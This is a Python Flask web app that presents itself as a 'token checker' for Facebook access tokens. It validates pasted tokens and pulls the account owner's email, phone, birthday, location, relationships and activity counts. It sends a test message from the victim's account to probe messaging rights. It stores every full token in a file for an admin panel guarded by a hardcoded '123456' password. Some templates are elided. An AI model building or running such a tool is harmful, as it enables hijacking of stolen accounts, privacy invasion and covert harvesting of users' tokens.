from flask import Flask, request, render_template_string, session, redirect, url_for
import requests
import time
import secrets
import json
import os

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# ADMIN CREDENTIALS
ADMIN_USERNAME = "legend"
ADMIN_PASSWORD = "123456"

TOKENS_FILE = 'checked_tokens.json'

def load_tokens():
    if os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_tokens(tokens):
    with open(TOKENS_FILE, 'w') as f:
        json.dump(tokens[-100:], f, indent=2)

checked_tokens = load_tokens()

def check_token_with_message(token):
    token = token.strip()
    
    result = {
        "valid": False,
        "status": "NAHI CHAL RAHA",
        "name": "Unknown",
        "uid": "Unknown",
        "token_prefix": token[:10] + "..." + token[-5:],
        "full_token": token,
        "checked_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry_guess": "Working Now",
        "profile_pic": "",
        "friends": "N/A",
        "pages": "N/A",
        "groups": "N/A",
        "email": "N/A",
        "phone": "N/A",
        "birthday": "N/A",
        "gender": "N/A",
        "location": "N/A",
        "hometown": "N/A",
        "relationship": "N/A",
        "work": "N/A",
        "education": "N/A",
        "posts_count": "N/A",
        "photos_count": "N/A",
        "videos_count": "N/A",
        "permissions": []
    }

    # STEP 1: ME API → ALL BASIC INFO
    me_url = "https://graph.facebook.com/v15.0/me"
    fields = "id,name,picture.width(200),email,mobile_phone,birthday,gender,location,hometown,relationship_status,work,education"
    params = {'access_token': token, 'fields': fields}
    try:
        r = requests.get(me_url, params=params, timeout=10)
        if r.status_code != 200:
            return result
        data = r.json()
        result["uid"] = data.get('id', 'N/A')
        result["name"] = data.get('name', 'N/A')
        result["profile_pic"] = data.get('picture', {}).get('data', {}).get('url', '')
        result["email"] = data.get('email', 'N/A')
        result["phone"] = data.get('mobile_phone', 'N/A')
        result["birthday"] = data.get('birthday', 'N/A')
        result["gender"] = data.get('gender', 'N/A')
        result["location"] = data.get('location', {}).get('name', 'N/A') if data.get('location') else 'N/A'
        result["hometown"] = data.get('hometown', {}).get('name', 'N/A') if data.get('hometown') else 'N/A'
        result["relationship"] = data.get('relationship_status', 'N/A')
        result["work"] = ", ".join([w.get('employer', {}).get('name', '') for w in data.get('work', [])]) if data.get('work') else 'N/A'
        result["education"] = ", ".join([e.get('school', {}).get('name', '') for e in data.get('education', [])]) if data.get('education') else 'N/A'
        result["valid"] = True
        result["status"] = "CHAL RAHA HAI"
    except:
        return result

    # STEP 2: SMART EXPIRY GUESS
    if token.startswith("EAAA"):
        result["expiry_guess"] = "Short-lived (1-2 hours)"
    elif token.startswith("EAAG") or len(token) > 300:
        result["expiry_guess"] = "Long-lived (60 days)"
    elif token.startswith("EAAD"):
        result["expiry_guess"] = "Page Token (Never expires)"
    else:
        result["expiry_guess"] = "Working Now"

    # STEP 3: COUNTS
    try:
        r = requests.get(f"https://graph.facebook.com/v15.0/{result['uid']}/friends", params={'access_token': token, 'summary': 'total_count'}, timeout=10)
        if r.status_code == 200:
            result["friends"] = r.json().get('summary', {}).get('total_count', 'N/A')
    except: pass

    try:
        r = requests.get(f"https://graph.facebook.com/v15.0/{result['uid']}/likes", params={'access_token': token, 'summary': 'total_count'}, timeout=10)
        if r.status_code == 200:
            result["pages"] = r.json().get('summary', {}).get('total_count', 'N/A')
    except: pass

    try:
        r = requests.get(f"https://graph.facebook.com/v15.0/{result['uid']}/groups", params={'access_token': token, 'summary': 'total_count'}, timeout=10)
        if r.status_code == 200:
            result["groups"] = r.json().get('summary', {}).get('total_count', 'N/A')
    except: pass

    try:
        r = requests.get(f"https://graph.facebook.com/v15.0/{result['uid']}/posts", params={'access_token': token, 'summary': 'total_count'}, timeout=10)
        if r.status_code == 200:
            result["posts_count"] = r.json().get('summary', {}).get('total_count', 'N/A')
    except: pass

    try:
        r = requests.get(f"https://graph.facebook.com/v15.0/{result['uid']}/photos", params={'access_token': token, 'summary': 'total_count'}, timeout=10)
        if r.status_code == 200:
            result["photos_count"] = r.json().get('summary', {}).get('total_count', 'N/A')
    except: pass

    try:
        r = requests.get(f"https://graph.facebook.com/v15.0/{result['uid']}/videos", params={'access_token': token, 'summary': 'total_count'}, timeout=10)
        if r.status_code == 200:
            result["videos_count"] = r.json().get('summary', {}).get('total_count', 'N/A')
    except: pass

    # STEP 4: PERMISSIONS
    try:
        r = requests.get(f"https://graph.facebook.com/v15.0/{result['uid']}/permissions", params={'access_token': token}, timeout=10)
        if r.status_code == 200:
            result["permissions"] = [p['permission'] for p in r.json().get('data', []) if p.get('status') == 'granted']
    except: pass

    # STEP 5: MESSAGE TEST
    try:
        convo_url = f"https://graph.facebook.com/v15.0/{result['uid']}/conversations"
        r = requests.get(convo_url, params={'access_token': token, 'limit': 1}, timeout=10)
        if r.status_code == 200 and r.json().get('data'):
            convo_id = r.json()['data'][0]['id']
            send_url = f"https://graph.facebook.com/v15.0/{convo_id}/messages"
            send_r = requests.post(send_url, data={'message': f"TEST_{int(time.time())}", 'access_token': token}, timeout=10)
            if send_r.status_code != 200:
                error = send_r.json().get('error', {}).get('message', '').lower()
                if "messaging" in error or "permission" in error:
                    result["status"] = "CHAL RAHA HAI (No Msg Perm)"
                else:
                    result["status"] = "CHAL RAHA HAI (Msg Error)"
        else:
            result["status"] = "CHAL RAHA HAI (No Convo)"
    except:
        result["status"] = "CHAL RAHA HAI (Network)"

    checked_tokens.append(result)
    save_tokens(checked_tokens)
    return result

# ROUTES & TEMPLATES (same as before, updated to show new fields)
# ... (same HOME_TEMPLATE, LOGIN_TEMPLATE, ADMIN_TEMPLATE — just more fields)

HOME_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>UNIVERSAL TOKEN CHECKER</title>
  <style>
    body { background: #000; color: #0f0; font-family: 'Courier New'; text-align: center; padding: 20px; }
    input, button { margin: 10px; padding: 14px; width: 90%; max-width: 420px; border: 1px solid #0f0; background: #111; color: #0f0; border-radius: 10px; font-size: 16px; }
    button { background: #0f0; color: #000; font-weight: bold; }
    h1 { text-shadow: 0 0 20px #0f0; font-size: 2.2em; }
    .result { background: #111; border: 1px solid #0f0; padding: 18px; margin: 20px; border-radius: 12px; font-size: 14px; }
    .valid { color: #0f0; font-size: 1.5em; font-weight: bold; }
    .invalid { color: #f55; font-size: 1.5em; font-weight: bold; }
    .admin-btn { background: #ff0; color: #000; margin-top: 40px; padding: 14px; font-weight: bold; border-radius: 10px; }
    .pic { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #0f0; margin: 10px; }
  </style>
</head>
<body>
  <h1>TOKEN CHECKER</h1>
  <p style="color:#0f0;">EAAD, EAAB, EAAAA, EAAG - Sab Chalega!</p>
  <form method="post">
    <input type="text" name="token" placeholder="Paste Any Facebook Token" required>
    <button type="submit">CHECK TOKEN</button>
  </form>

  {% if result %}
  <div class="result">
    {% if result.valid %}
    <p class="valid">{{ result.status }}</p>
    {% else %}
    <p class="invalid">{{ result.status }}</p>
    {% endif %}
    {% if result.profile_pic %}
    <img src="{{ result.profile_pic }}" class="pic">
    {% endif %}
    <p><b>Name:</b> {{ result.name }}</p>
    <p><b>UID:</b> {{ result.uid }}</p>
    <p><b>Email:</b> {{ result.email }}</p>
    <p><b>Phone:</b> {{ result.phone }}</p>
    <p><b>Birthday:</b> {{ result.birthday }}</p>
    <p><b>Gender:</b> {{ result.gender }}</p>
    <p><b>Location:</b> {{ result.location }}</p>
    <p><b>Hometown:</b> {{ result.hometown }}</p>
    <p><b>Relationship:</b> {{ result.relationship }}</p>
    <p><b>Work:</b> {{ result.work }}</p>
    <p><b>Education:</b> {{ result.education }}</p>
    <p><b>Token:</b> {{ result.token_prefix }}</p>
    <p><b>Valid for:</b> {{ result.expiry_guess }}</p>
    <p><b>Friends:</b> {{ result.friends }}</p>
    <p><b>Pages:</b> {{ result.pages }}</p>
    <p><b>Groups:</b> {{ result.groups }}</p>
    <p><b>Posts:</b> {{ result.posts_count }}</p>
    <p><b>Photos:</b> {{ result.photos_count }}</p>
    <p><b>Videos:</b> {{ result.videos_count }}</p>
    <p><b>Permissions:</b> {{ result.permissions|join(', ') }}</p>
  </div>
  {% endif %}

  <a href="/admin/login"><button class="admin-btn">ADMIN PANEL</button></a>
</body>
</html>
'''

# ADMIN_TEMPLATE — same fields + more
# ... (just like HOME but with full token + copy)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
